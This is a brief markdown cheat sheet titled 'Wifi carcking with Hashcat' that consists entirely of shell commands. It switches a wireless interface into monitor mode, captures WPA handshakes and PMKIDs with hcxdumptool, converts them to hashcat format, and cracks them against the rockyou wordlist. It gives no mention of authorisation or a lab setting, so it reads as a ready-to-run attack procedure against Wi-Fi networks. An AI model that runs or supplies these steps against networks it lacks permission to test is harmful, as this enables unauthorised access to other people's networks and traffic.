# Wifi carcking with Hashcat
```sh
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
```

```sh
hcxdumptool -i wlan1 -w dumpfile.pcapng
```
```sh
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
```

```sh
hashcat -m 22000 hash.hc22000 rockyou.txt
```

```sh
sudo systemctl start NetworkManager.service
sudo systemctl start wpa_supplicant.service
```

